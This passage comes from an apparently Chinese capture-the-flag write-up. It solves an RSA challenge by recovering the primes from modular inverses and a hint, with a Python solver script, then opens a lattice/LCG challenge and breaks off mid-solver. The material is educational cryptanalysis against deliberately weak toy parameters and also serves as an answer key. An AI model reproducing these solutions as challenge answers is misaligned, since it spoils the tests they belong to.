class="hljs-number">114514</span>, q, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hint=&quot;</span>,hint)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">n= 12775720506835890504634034278254395430943267336816473660983646973423280986156683988190224391394224069040565587173690009193979401332176772774003070053150665425296356891182224095151626957780349726980433545162004592720236315207871365869074491602494662741551613634958123374477023452496165047922053316939727488269523121920612595228860205356006298829652664878874947173274376497334009997867175453728857230796230189708744624237537460795795419731996104364946593492505600336294206922224497794285687308908233911851722675754289376914626682400586422368439122244417279745706732355332295177737063024381192630487607768783465981451061</span><br><span class="hljs-string">c= 11915755246503584850391275332434803210208427722294114071001100308626307947436200730224125480063437044802693983505018296915205479746420176594816835977233647903359581826758195341201097246092133133080060014734506394659931221663322724002898147351352947871411658624516142945817233952310735792476179959957816923241946083918670905682025431311942375276709386415064702578261223172000098847340935816693603778431506315238612938066215726795441606532661443096921685386088202968978123769780506210313106183173960388498229061590976260661410212374609180449458118176113016257713595435899800372393071369403114116302366178240855961673903</span><br><span class="hljs-string">hint= 3780943720055765163478806027243965253559007912583544143299490993337790800685861348603846579733509246734554644847248999634328337059584874553568080801619380770056010428956589779410205977076728450941189508972291059502282197067064652703679207594494311426932070873126291964667101759741689303119878339091991064473009603015444698156763131697516348762529243379294719509271792197450290763350043267150173332933064667716343268081089911389405010661267902446894363575630871542572200564687271311946580866369204751787686029541644463829030926902617740142434884740791338666415524172057644794094577876577760376741447161098006698524808</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br></code></pre></td></tr></table></figure><p><strong>分析：</strong></p><h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>$\because p1\equiv p^{-1} \mod q$<br>$q1\equiv q^{-1} \mod p$<br>$\therefore p\cdot p1 \equiv 1 \mod q$<br>$q\cdot q1 \equiv 1 \mod p$<br>$\therefore p\cdot p1 &#x3D; 1+k1\cdot q$<br>$q\cdot q1 &#x3D; 1+k2\cdot p$<br>$\therefore p\cdot p1-1 &#x3D;k1\cdot q$<br>$q\cdot q1-1&#x3D;k2\cdot p$</p><blockquote><p>ps1：这里首先已知$0&lt;p1&lt;q,0&lt;q1&lt;p$，因此有$k1\cdot q&lt;pq,k2\cdot p&lt;pq$，则有$k1&lt;p,k2&lt;q$</p></blockquote><h4 id="1-证明-k1-p-q1-k2-q-p1"><a href="#1-证明-k1-p-q1-k2-q-p1" class="headerlink" title="(1)证明$k1&#x3D;p-q1,k2&#x3D;q-p1$"></a>(1)证明$k1&#x3D;p-q1,k2&#x3D;q-p1$</h4><p>两式相减，得到<br>$p\cdot p1 -q\cdot q1 &#x3D; k1\cdot q - k2\cdot p$<br>化简得<br>$(p1+k2)\cdot p &#x3D; (q1+k1)\cdot q$<br>分析，由于$p,q$肯定是互质的，若要满足该等式，必然有$p$整除$q1+k1$，$q$整除$p1+k2$<br>再由前面ps1的结论可知，$0&lt;q1+k1&lt;2\cdot p,0&lt;p1+k2&lt;2\cdot q$<br>$\therefore q1+k1&#x3D;p,p1+k2&#x3D;q$<br>即$k1&#x3D;p-q1,k2&#x3D;q-p1$</p><h4 id="2-证明-p1q1-k1k2-1"><a href="#2-证明-p1q1-k1k2-1" class="headerlink" title="(2)证明$p1q1-k1k2&#x3D;1$"></a>(2)证明$p1q1-k1k2&#x3D;1$</h4><p>$pq\cdot p1q1-pp1-qq1+1&#x3D;k1k2\cdot pq$<br>变换得$(p1\cdot q1 - k1\cdot k2)\cdot pq&#x3D;pp1+qq1-1$<br>$\because p1&lt;q,q1&lt;p$<br>$\therefore 0&lt;(p1q1-k1k2)\cdot pq &lt;2\cdot pq$<br>$\therefore p1q1-k1k2&#x3D;1$</p><h4 id="3-构造二次方程求-k"><a href="#3-构造二次方程求-k" class="headerlink" title="(3)构造二次方程求$k$"></a>(3)构造二次方程求$k$</h4><p>$phi&#x3D;(p-1)\cdot (q-1)$<br>$&#x3D;(q1+k1-1)\cdot (p1+k2-1)$<br>$&#x3D;(q1-1+k1)\cdot (p1-1+k2)$<br>$&#x3D;(q1-1)\cdot (p1-1)+k1\cdot (p1-1)+k2\cdot (q1-1)+k1k2$<br>$&#x3D;(q1-1)\cdot (p1-1)+k1\cdot (p1-1)+\frac{p1q1-1}{k1}\cdot (q1-1)+p1q1-1$<br>移项得<br>$(q1-1)\cdot (p1-1)+k1\cdot (p1-1)+\frac{p1q1-1}{k1}\cdot (q1-1)+p1q1-1-phi&#x3D;0$<br>变换成关于$k1$的一元二次方程<br>$(p1-1)\cdot k1^2+[(q1-1)\cdot (p1-1)+p1q1-phi-1]\cdot k1+(p1q1-1)(q1-1)&#x3D;0$</p><p>之后解方程得到整数$k1,k2$，再代入便可以计算出$p,q$，之后便可以解出$n,d$，直接解密得到flag</p><h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>$\because hint\equiv (2023p+114514)^q  \mod n$<br>$\therefore hint\equiv 114514^q \mod p$<br>由费马小定理得$a^p\equiv  a \mod p$<br>$\therefore hint \equiv 114514^{pq}\mod p$<br>$\therefore hint-114514^n&#x3D;kp$<br>$\therefore p&#x3D;gcd(n,hint-114514^n)$</p><p><strong>代码：</strong></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, bytes_to_long<br><br><span class="hljs-comment">#part1</span><br>p1= <span class="hljs-number">3020925936342826638134751865559091272992166887636010673949262570355319420768006254977586056820075450411872960532347149926398408063119965574618417289548987</span><br>q1= <span class="hljs-number">4671408431692232396906683283409818749720996872112784059065890300436550189441120696235427299344866325968178729053396743472242000658751114391777274910146291</span><br>cipher= <span class="hljs-number">25112054943247897935419483097872905208058812866572413543619256987820739973912338143408907736140292730221716259826494247791605665059462509978370784276523708331832947651238752021415405546380682507724076832547566130498713598421615793975775973104012856974241202142929158494480919115138145558312814378701754511483</span><br>phi= <span class="hljs-number">57503658815924732796927268512359220093654065782651166474086873213897562591669139461637657743218269483127368502067086834142943722633173824328770582751298229218384634668803018140064093913557812104300156596305487698041934061627496715082394633864043543838906900101637618600513874001567624343801197495058260716932</span><br>e = <span class="hljs-number">65537</span><br>d = gmpy2.invert(e, phi)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">a,b,c</span>):<br>    delta = b*b - <span class="hljs-number">4</span>*a*c<br>    <span class="hljs-keyword">if</span> delta &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    sqrt_delta = gmpy2.iroot(delta,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    k1 = (-b + sqrt_delta) // (<span class="hljs-number">2</span>*a)<br>    k2 = (-b - sqrt_delta) // (<span class="hljs-number">2</span>*a)<br>    <span class="hljs-keyword">return</span> k1, k2<br><br>a = p1-<span class="hljs-number">1</span><br>b = (q1-<span class="hljs-number">1</span>)*(p1-<span class="hljs-number">1</span>)+p1*q1-phi-<span class="hljs-number">1</span><br>c = (p1*q1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>k1,k2 = solve(a,b,c)<br><br><br><span class="hljs-keyword">if</span> (p1*q1-<span class="hljs-number">1</span>) % k1 == <span class="hljs-number">0</span>:<br>    k2 = (p1*q1-<span class="hljs-number">1</span>) // k1<br><span class="hljs-keyword">elif</span> (p1*q1-<span class="hljs-number">1</span>) % k2 == <span class="hljs-number">0</span>:<br>    k1,k2= k2,(p1*q1-<span class="hljs-number">1</span>) // k2<br><span class="hljs-comment">#print(k1,k2)</span><br><br><span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">#保留正数解</span><br><span class="hljs-string">k_candidates = [k for k in (k1, k2) if k &gt; 0 and (p1 * q1 - 1) % k == 0]</span><br><span class="hljs-string">if not k_candidates:</span><br><span class="hljs-string">    print(&quot;No valid k found&quot;)</span><br><span class="hljs-string">    exit()</span><br><span class="hljs-string">k1 = k_candidates[0]</span><br><span class="hljs-string">k2 = (p1 * q1 - 1) // k1 </span><br><span class="hljs-string">print(k1,k2)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>p =q1+k1<br>q =p1+k2<br>n = p * q<br>m1 = <span class="hljs-built_in">pow</span>(cipher, d, n)<br>ans1 = long_to_bytes(m1)    <br><span class="hljs-built_in">print</span>(ans1)<br><br><span class="hljs-comment">#part2</span><br>n= <span class="hljs-number">12775720506835890504634034278254395430943267336816473660983646973423280986156683988190224391394224069040565587173690009193979401332176772774003070053150665425296356891182224095151626957780349726980433545162004592720236315207871365869074491602494662741551613634958123374477023452496165047922053316939727488269523121920612595228860205356006298829652664878874947173274376497334009997867175453728857230796230189708744624237537460795795419731996104364946593492505600336294206922224497794285687308908233911851722675754289376914626682400586422368439122244417279745706732355332295177737063024381192630487607768783465981451061</span><br>cipher= <span class="hljs-number">11915755246503584850391275332434803210208427722294114071001100308626307947436200730224125480063437044802693983505018296915205479746420176594816835977233647903359581826758195341201097246092133133080060014734506394659931221663322724002898147351352947871411658624516142945817233952310735792476179959957816923241946083918670905682025431311942375276709386415064702578261223172000098847340935816693603778431506315238612938066215726795441606532661443096921685386088202968978123769780506210313106183173960388498229061590976260661410212374609180449458118176113016257713595435899800372393071369403114116302366178240855961673903</span><br>hint= <span class="hljs-number">3780943720055765163478806027243965253559007912583544143299490993337790800685861348603846579733509246734554644847248999634328337059584874553568080801619380770056010428956589779410205977076728450941189508972291059502282197067064652703679207594494311426932070873126291964667101759741689303119878339091991064473009603015444698156763131697516348762529243379294719509271792197450290763350043267150173332933064667716343268081089911389405010661267902446894363575630871542572200564687271311946580866369204751787686029541644463829030926902617740142434884740791338666415524172057644794094577876577760376741447161098006698524808</span><br><br>p = gmpy2.gcd(n, <span class="hljs-built_in">pow</span>(<span class="hljs-number">114514</span>,n,n)-hint )<br>q = n // p<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, phi)<br>m2 = <span class="hljs-built_in">pow</span>(cipher, d, n)<br>ans2 = long_to_bytes(m2)<br><span class="hljs-built_in">print</span>(ans2)<br><span class="hljs-built_in">print</span>(ans1 + ans2)<br></code></pre></td></tr></table></figure><h2 id="LatticeLCG"><a href="#LatticeLCG" class="headerlink" title="LatticeLCG"></a>LatticeLCG</h2><p><strong>题目：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******************************&#125;&#x27;</span><br><br>a = getPrime(<span class="hljs-number">512</span>)<br>seed = getPrime(<span class="hljs-number">512</span>)<br>b = bytes_to_long(flag)<br>n = getPrime(<span class="hljs-number">1024</span>)<br><br>e1 = <span class="hljs-number">2333</span><br>e2 = <span class="hljs-number">23333</span><br>c1 = <span class="hljs-built_in">pow</span>(a,e1,n)<br>c2 = <span class="hljs-built_in">pow</span>(a,e2,n)<br><br>output = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    seed = (a*seed+b)%n<br>    output.append(seed)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1 = &quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c2 = &quot;</span>,c2)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;output1 = &quot;</span>,output[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;output2 = &quot;</span>,output[<span class="hljs-number">1</span>])<br><br><br>e = [getPrime(<span class="hljs-number">128</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)]<br>out = []<br>m = getPrime(<span class="hljs-number">64</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>    out.append(<span class="hljs-built_in">pow</span>(m,i,n))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;out=&quot;</span>,out)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">c1 =  132894829064255831243210470637067717685821770359549730768366345840525257033166172926149293454192143005551270166547902269036843756318967855047301751521125394803373953151753927497701242767032542708689455184991906629946511295108898559666019232955132938245031352553261823905498810285940911315433144300083027795647</span><br><span class="hljs-string">c2 =  24086830909813702968855830967174364278115647345064163689290457852025690324300607354444884288995399344650789235347773145941872226843099538451759854505842021844881825309790171852845467221751852440178862638893185965125776165397575087879479327323737686652198357863042305078811580074617322063509435591981140533310</span><br><span class="hljs-string">output1 =  54997286032365904331111467760366122947903752273328087460831713533712307510311367648330090376100815622160705007873798883153287827481112070182047111994066594911019010222064952859306742931009422376955635523160546531204043294436812066746785938062292942759004837173423765427628610568097898331237064396308950601636</span><br><span class="hljs-string">output2 =  115015764780168428067411132384122324817310808727138440691727747976276050930701648349452842302609389394467134068064132550313721128807222231505312226682756817617177620169804112319332815872107656884931985435898097063491690413460967856530075292289784649593915313885813931026280791070577034075346669028068003251024</span><br><span class="hljs-string">e= [297332330847212015073434001239859795661, 247136911662054641479463124065475615181, 269964458627145370722389742095701827701, 270745917671094194052444327351021588037, 254010082507930275771798119457499420531, 219178601856077385518322602059961601013, 226562702503988968288128483964146379529, 236756812424464516919183114495913408541, 330800121752029915693039296018980956519, 244800084005240595691424199440981715431, 171753849214889522920105847094773384191, 175843874533972361422410968920873382741, 326554577162848075059517044795930784993, 181842368629269753698222635712342485771, 221634122983362091660188171985742369561, 314244561819808202322467576330355199409, 286703236198397527318161582654787197007, 298101543059628501506668748374542117409, 304158884506393754601331945634109778837, 227577031261920314010408499530794497453]</span><br><span class="hljs-string">out= [100163998802948218573427220530909801629443946118807841130458771881611961921044413091457977957530737347507311468578174294420439883266450142918647561103714976340598499984679873518770686239019753272419975426555435266764099822607336645955391865380657632176223122712125661464370522088500110746571354290680063421912, 123528268396018633078964378145622645321836134964966941909300627704018826667414656614011250938241127521627117348901416042868382174504514240509791471909819407751786633761392047187057200130450960708049681366686147337178110669163142189940397343388837018627392202704211693014162963133958078984558400205296509955066, 50364974727218716170137342348825758682286710377257708196467656986986475658591351848251278364177715325447140300281348027787487944839878770556527568407280736570303345044999352851718908253510696083227344179177110348363623815158409862985684687329665113210373028159714648637297476014803935686233984711925346269925, 9159042298258514259206302054907530984498816597282237786310355131965025367180505822032135021520906576471052417629425493533222088036674196397387325202128095476044308794426593565419139845832998557280786358482011226957053125314152322427131984411160984485669030286331376124575677908877399942011661647598763754231, 83466948172962290899792524342204996697711370224947233607865306692546824512672969402433314856742908546253967225963904395036102408684746619744412073888614033881366518452878344698289278946024167788789718690655953517892282374396760436658422838909903123439370164929347147855359470889455753772857233516742991766128, 72028057477369331020972407277180913909557985390590548305094935208898254733240351763155769013959589016793318772858662702447133499307826143247356049051993727167694036585280387890126287679890730586145740176250715386149857291210207281073772478229355625725300592003798974298248102432508449566953296818450441875311, 63397152736399466888877444377156185012692670493456346196278062009641363047685720620967313379507212944658351683022480839941265221126018392433078546696140135677499181555082643172378488800458657825640013090182171355299282023794908520172571785687147143015581400891531296496177973817400317905868361800342940667657, 45427004823510815929685208038284324980662968275105063862891077759131069014314933978878667052450145039482242546093735499108826130367476890384431317243013990394189191560941678120985717370542332803012619694821129395559214706968432476548145608291516176910849698455496733056096163035964057523545705356926187216133, 85046100612081858546755294340770681541320509587396377967875404950325314121709046137842413744740490231945105758075761946555179595664901813127463402854440384657046429776033129391138370272524736543471909307910018577738207910417672603889922445435939876023878220177983424547612635006926243055642166274730894301704, 5833380233103086014860892228744764647016585478949686583145531659689295506666493518453642500086277427538189091865461553097914845680665917702500908205558454036911757659426809969367680394533585635383007758339917554453268182491874683638880986360065633842854622244953985055815937671635222264056071882344388307409, 83587615309194701727032548415548847571046191382552371312058083137102227325098839286526833147951063338204327145093831238962818333112251936853329663907079943414231588222256242520221314528944937229985997926851198158564313703719031124442094987245466116488897263358510493905440842917634723859176839440753120904481, 108651960334634726889543063749359050688114025706494125848785084643330096858725917513596985853593252388835207675036982640195609499739937405655156895161071906340785173459426867946058638393154997931747445494284445204735492709747637173698383609764016673932827648159152658645291248613736662020472251048171789274368, 118612010487916657134965416492319303083994743753602531817008130269546146141506819718265549648441671373744766173780682168587021797626910931105508317440664521595783406848956221465897709761805869130021172013000282497881581247777388315282629463546261696169893882772397797722134711444928443061384985458691749569847, 106808406616890955924408992591724627593882118490933791849624747503316110669154243209826761617940864170830792705070618439466645580274835929100331418955890808763286193770831205511071440703609240364726061677822134370309018443508205980554831705850988319397384130044484586798585896460152167042282847992593429629533, 88091869606421350393441194783722851111189272445506506936925797213395319937783082680078622732926273935980894566775394134783157488360516905477700601820480975112122167589887641130656305741351643175495552454293030309247254533571254198691204714097846510872592569447050033289483493274672346210063885124570695832880, 94400859500860667431780782962782396345261822402898708716634581228428633704975879685572548692997007974004673676539496590659276952154740096463133011458100387006276325192223993452314873089466451613079029429327880672384210802191677586975844471189127835578979108767548290181668434770385199468588493042256788539610, 76177813724283720012398394789596589415486093955132688784865364048503447246391866424200071522136707581280434193680972230914105236504028522288780213089260160776489804587209115330412067560802680789338779056583047491942817016437672075192528508677997165703606520158178725128251694801612417667440677124932361973397, 17188209523466762369281362386525396145127294763502094183797065621821932913685690176344514910405677170931795652509426794846131051983826422536084073462084935517166603832542862106287058675490933197600813710203114108790043880150305327523679949543592622443904084453387396870899883324751789625806819506542619123964, 120007173989070249117019147454557020213723707722383599019972471016186584968096445904023372671513462965078400715365736756710078805039115601609874780421117795585342458478316236202328120583456334489780231976628584606042971207759763658961365139429661536955996519512283283500790612975034779837647053750631763512799, 18797057418663411295612229938999282286746920748194349166509084258061650142260043277698907538088835210620841171754186980908772147495732980563542600139935202965632319542217264685208215907551992891370166006725534397313373079841419662622936316343820775075897977228084528246337988431658221881343556854053475137330]</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>分析：</strong><br>首先观察代码分为两部分：</p><ul><li>第一部分：求LCG的b，要求我们知道$a,X_0,X_1,n$的值，$a$的值可以通过一个简单的共模攻击求出，而$n$的值则需要第二部分求出</li><li>第二部分：求模$n$，已知一组RSA密文和公钥，类似于共模攻击，但不知道模$n$，由于$m$是小值，且有多组数据，因此这部分应该是要利用格来求模$n$<br>我们先解决第二部分：<br>由于$e$均为素数，因此两两互质，即有<br>$k_1e_1+k_2e_2+…+k_ne_n&#x3D;1$<br>构造格如下：</li></ul><span>$$\begin{bmatrix}k_1 & k_2 & \cdots & k_{20}\end{bmatrix}\begin{bmatrix}1 & 0 & 0 & \cdots & 0 & De_1 \\0 & 1 & 0 & \cdots & 0 & De_2 \\\vdots & \vdots &\vdots &\ddots & \vdots &\vdots \\0 & 0 & 0 &\cdots & 1 & De_{20}\end{bmatrix}=\begin{bmatrix}k_1 & k_2 & \cdots & k_{20} & 1\end{bmatrix}$$<\span><blockquote><p>ps：这里有一点需要注意，就是$k$目前的范围无法确定，因此$D$也不好直接确定，因此决定进行爆破</p></blockquote><p>然后便可以利用求出的$k$来求$n$，之后第一部分便可以解决了。<br><strong>代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>c1 =  <span class="hljs-number">132894829064255831243210470637067717685821770359549730768366345840525257033166172926149293454192143005551270166547902269036843756318967855047301751521125394803373953151753927497701242767032542708689455184991906629946511295108898559666019232955132938245031352553261823905498810285940911315433144300083027795647</span><br>c2 =  <span class="hljs-number">24086830909813702968855830967174364278115647345064163689290457852025690324300607354444884288995399344650789235347773145941872226843099538451759854505842021844881825309790171852845467221751852440178862638893185965125776165397575087879479327323737686652198357863042305078811580074617322063509435591981140533310</span><br>output1 =  <span class="hljs-number">54997286032365904331111467760366122947903752273328087460831713533712307510311367648330090376100815622160705007873798883153287827481112070182047111994066594911019010222064952859306742931009422376955635523160546531204043294436812066746785938062292942759004837173423765427628610568097898331237064396308950601636</span><br>output2 =  <span class="hljs-number">115015764780168428067411132384122324817310808727138440691727747976276050930701648349452842302609389394467134068064132550313721128807222231505312226682756817617177620169804112319332815872107656884931985435898097063491690413460967856530075292289784649593915313885813931026280791070577034075346669028068003251024</span><br>e= [<span class="hljs-number">297332330847212015073434001239859795661</span>, <span class="hljs-number">247136911662054641479463124065475615181</span>, <span class="hljs-number">269964458627145370722389742095701827701</span>, <span class="hljs-number">270745917671094194052444327351021588037</span>, <span class="hljs-number">254010082507930275771798119457499420531</span>, <span class="hljs-number">219178601856077385518322602059961601013</span>, <span class="hljs-number">226562702503988968288128483964146379529</span>, <span class="hljs-number">236756812424464516919183114495913408541</span>, <span class="hljs-number">330800121752029915693039296018980956519</span>, <span class="hljs-number">244800084005240595691424199440981715431</span>, <span class="hljs-number">171753849214889522920105847094773384191</span>, <span class="hljs-number">175843874533972361422410968920873382741</span>, <span class="hljs-number">326554577162848075059517044795930784993</span>, <span class="hljs-number">181842368629269753698222635712342485771</span>, <span class="hljs-number">221634122983362091660188171985742369561</span>, <span class="hljs-number">314244561819808202322467576330355199409</span>, <span class="hljs-number">286703236198397527318161582654787197007</span>, <span class="hljs-number">298101543059628501506668748374542117409</span>, <span class="hljs-number">304158884506393754601331945634109778837</span>, <span class="hljs-number">227577031261920314010408499530794497453</span>]<br>out= [<span class="hljs-number">100163998802948218573427220530909801629443946118807841130458771881611961921044413091457977957530737347507311468578174294420439883266450142918647561103714976340598499984679873518770686239019753272419975426555435266764099822607336645955391865380657632176223122712125661464370522088500110746571354290680063421912</span>, <span class="hljs-number">123528268396018633078964378145622645321836134964966941909300627704018826667414656614011250938241127521627117348901416042868382174504514240509791471909819407751786633761392047187057200130450960708049681366686147337178110669163142189940397343388837018627392202704211693014162963133958078984558400205296509955066</span>, <span class="hljs-number">50364974727218716170137342348825758682286710377257708196467656986986475658591351848251278364177715325447140300281348027787487944839878770556527568407280736570303345044999352851718908253510696083227344179177110348363623815158409862985684687329665113210373028159714648637297476014803935686233984711925346269925</span>, <span class="hljs-number">9159042298258514259206302054907530984498816597282237786310355131965025367180505822032135021520906576471052417629425493533222088036674196397387325202128095476044308794426593565419139845832998557280786358482011226957053125314152322427131984411160984485669030286331376124575677908877399942011661647598763754231</span>, <span class="hljs-number">83466948172962290899792524342204996697711370224947233607865306692546824512672969402433314856742908546253967225963904395036102408684746619744412073888614033881366518452878344698289278946024167788789718690655953517892282374396760436658422838909903123439370164929347147855359470889455753772857233516742991766128</span>, <span class="hljs-number">72028057477369331020972407277180913909557985390590548305094935208898254733240351763155769013959589016793318772858662702447133499307826143247356049051993727167694036585280387890126287679890730586145740176250715386149857291210207281073772478229355625725300592003798974298248102432508449566953296818450441875311</span>, <span class="hljs-number">63397152736399466888877444377156185012692670493456346196278062009641363047685720620967313379507212944658351683022480839941265221126018392433078546696140135677499181555082643172378488800458657825640013090182171355299282023794908520172571785687147143015581400891531296496177973817400317905868361800342940667657</span>, <span class="hljs-number">45427004823510815929685208038284324980662968275105063862891077759131069014314933978878667052450145039482242546093735499108826130367476890384431317243013990394189191560941678120985717370542332803012619694821129395559214706968432476548145608291516176910849698455496733056096163035964057523545705356926187216133</span>, <span class="hljs-number">85046100612081858546755294340770681541320509587396377967875404950325314121709046137842413744740490231945105758075761946555179595664901813127463402854440384657046429776033129391138370272524736543471909307910018577738207910417672603889922445435939876023878220177983424547612635006926243055642166274730894301704</span>, <span class="hljs-number">5833380233103086014860892228744764647016585478949686583145531659689295506666493518453642500086277427538189091865461553097914845680665917702500908205558454036911757659426809969367680394533585635383007758339917554453268182491874683638880986360065633842854622244953985055815937671635222264056071882344388307409</span>, <span class="hljs-number">83587615309194701727032548415548847571046191382552371312058083137102227325098839286526833147951063338204327145093831238962818333112251936853329663907079943414231588222256242520221314528944937229985997926851198158564313703719031124442094987245466116488897263358510493905440842917634723859176839440753120904481</span>, <span class="hljs-number">108651960334634726889543063749359050688114025706494125848785084643330096858725917513596985853593252388835207675036982640195609499739937405655156895161071906340785173459426867946058638393154997931747445494284445204735492709747637173698383609764016673932827648159152658645291248613736662020472251048171789274368</span>, <span class="hljs-number">118612010487916657134965416492319303083994743753602531817008130269546146141506819718265549648441671373744766173780682168587021797626910931105508317440664521595783406848956221465897709761805869130021172013000282497881581247777388315282629463546261696169893882772397797722134711444928443061384985458691749569847</span>, <span class="hljs-number">106808406616890955924408992591724627593882118490933791849624747503316110669154243209826761617940864170830792705070618439466645580274835929100331418955890808763286193770831205511071440703609240364726061677822134370309018443508205980554831705850988319397384130044484586798585896460152167042282847992593429629533</span>, <span class="hljs-number">88091869606421350393441194783722851111189272445506506936925797213395319937783082680078622732926273935980894566775394134783157488360516905477700601820480975112122167589887641130656305741351643175495552454293030309247254533571254198691204714097846510872592569447050033289483493274672346210063885124570695832880</span>, <span class="hljs-number">94400859500860667431780782962782396345261822402898708716634581228428633704975879685572548692997007974004673676539496590659276952154740096463133011458100387006276325192223993452314873089466451613079029429327880672384210802191677586975844471189127835578979108767548290181668434770385199468588493042256788539610</span>, <span class="hljs-number">76177813724283720012398394789596589415486093955132688784865364048503447246391866424200071522136707581280434193680972230914105236504028522288780213089260160776489804587209115330412067560802680789338779056583047491942817016437672075192528508677997165703606520158178725128251694801612417667440677124932361973397</span>, <span class="hljs-number">17188209523466762369281362386525396145127294763502094183797065621821932913685690176344514910405677170931795652509426794846131051983826422536084073462084935517166603832542862106287058675490933197600813710203114108790043880150305327523679949543592622443904084453387396870899883324751789625806819506542619123964</span>, <span class="hljs-number">120007173989070249117019147454557020213723707722383599019972471016186584968096445904023372671513462965078400715365736756710078805039115601609874780421117795585342458478316236202328120583456334489780231976628584606042971207759763658961365139429661536955996519512283283500790612975034779837647053750631763512799</span>, <span 